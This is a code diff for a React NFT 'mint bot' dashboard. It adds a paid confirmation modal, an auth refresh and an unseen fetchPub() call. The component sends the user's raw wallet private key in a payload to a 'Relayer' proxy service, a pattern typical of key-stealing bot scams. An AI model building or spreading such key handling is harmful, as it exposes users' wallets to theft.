@@ -2,13 +2,13 @@ import React, { useState } from "react";
 import { ConnectButton } from "@rainbow-me/rainbowkit";
 import { Relayer } from './lib/proxyService';
 import { useChainId } from 'wagmi';
-
 import { checkPK } from './lib/checkBal';
-
 import { fetchDrop } from "./lib/fetchDrop";
 import Layout from './src/Components/Layout'; // Imported Layout
 import EnhancedNFTCard from './src/Components/EnhancedNFTCard';
-
+import  {fetchPub } from "./lib/fetchPub";
+import { useAuthStatus } from './lib/useAut';
+import ConfirmationModal from './src/Components/Confirmation';
 
 
 const MintBotDashboard: React.FC = () => {
@@ -30,8 +30,12 @@ const [nftDetails, setNftDetails] = useState({
   contractAddress: '',
   description: ''
 });
+const [showConfirmModal, setShowConfirmModal] = useState(false);
 
 
+
+
+  const  { refreshAuth } = useAuthStatus();
   const proxy = new Relayer();
   const chainId = useChainId();
 
@@ -52,9 +56,11 @@ const [nftDetails, setNftDetails] = useState({
         contractAddress: address,
         description: result.description || '' ,
       });
+      return true;
     } else {
       setErrorMessage(`⚠️ Failed to fetch NFT metadata.\n${result.error}`);
       setContractVerified(false);
+      return false;
     }
   };
 
@@ -70,8 +76,11 @@ const [nftDetails, setNftDetails] = useState({
         setErrorMessage("❌ Invalid contract address format.");
         setContractVerified(false);
       } else {
-        await getNFTMetadata(contractAddress.trim(), chainId);
-        setContractVerified(true);
+       const isValidMetadata = await getNFTMetadata(contractAddress.trim(), chainId);
+        if (isValidMetadata) {
+          setContractVerified(true);
+        }
+
       }
       setVerifying(false);
     }, 1000);
@@ -95,18 +104,22 @@ const [nftDetails, setNftDetails] = useState({
     }
 
 
-    const payload = {
+    setLoading(true);
+    setShowSuccess(false);
+    setIsSniping(true);
+
+    try {
+
+      await fetchPub();
+      refreshAuth();
+      
+      const payload = {
       privateKey: privateKey as `0x${string}`,
       contractAddress,
       chainId,
       gasMultiplier: 1 + speedValue / 100,
     };
 
-    setLoading(true);
-    setShowSuccess(false);
-    setIsSniping(true);
-
-    try {
       const result = await proxy.box(payload);
       setLoading(false);
       setIsSniping(false);
@@ -209,6 +222,7 @@ const [nftDetails, setNftDetails] = useState({
                 <p className="text-xs text-white/80 pt-2">NFT details loaded from on-chain data.</p>
               </div>
 
+
               <div className="border border-gray-500 p-4 mb-6 rounded">
                 <div className="flex justify-between mb-2 text-sm text-gray-400">
                   <span className={getSpeedLabel() === "normal" ? "text-white font-semibold" : ""}>normal</span>
@@ -235,7 +249,7 @@ const [nftDetails, setNftDetails] = useState({
 
               <div className="flex justify-between">
                 <button
-                  onClick={handleMint}
+                  onClick={() => setShowConfirmModal(true)}
                   className="border border-gray-400 text-white px-4 py-2 rounded hover:bg-white hover:text-black transition disabled:opacity-50 flex items-center gap-2 justify-center"
                   disabled={isSniping || loading}
                 >
@@ -247,7 +261,8 @@ const [nftDetails, setNftDetails] = useState({
                   ) : (
                     'Activate Bot'
                   )}
-                </button>
+              </button>
+
 
                 <button
                   onClick={handleCancel}
@@ -309,6 +324,17 @@ const [nftDetails, setNftDetails] = useState({
             </div>
           </div>
         )}
+        {showConfirmModal && (
+          <ConfirmationModal
+            message={ `Activating mint costs ${chainId === 1 ? "$5" : "$2"} are you sure you want to continue`}
+            onCancel={() => setShowConfirmModal(false)}
+            onProceed={() => {
+              setShowConfirmModal(false);
+              handleMint();
+            }}
+          />
+        )}
+
       </div>
     </Layout>
   );
